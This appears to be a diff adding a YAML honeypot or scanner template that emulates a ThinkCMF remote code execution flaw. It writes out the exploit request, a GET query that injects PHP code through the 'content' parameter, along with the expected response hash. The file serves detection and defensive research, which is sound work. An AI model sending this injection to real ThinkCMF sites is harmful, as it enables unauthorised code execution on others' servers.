@@ -1,0 +1,23 @@
+id: thinkcmf-arbitrary-code-execution
+info:
+  name: ThinkCMF - Remote Code Execution
+  author: pikpikcu
+  description: ThinkCMF is susceptible to remote code execution. An attacker can execute
+    malware, obtain sensitive information, modify data, and/or gain full control over
+    a compromised system without entering necessary credentials.
+  severity: high
+  reference:
+  - https://www.shuzhiduo.com/A/l1dygr36Je/
+  metadata:
+    max-request: 1
+  tags: thinkcmf,rce
+traps:
+- request:
+    method: GET
+    path: /index.php?g=g&m=Door&a=index&content=<?php%20echo%20md5('ThinkCMF');
+    headers: null
+    body: null
+  response:
+    status_code: 200
+    headers: {}
+    body: d9b2c63a497e2f30c4ad9ad083a00691
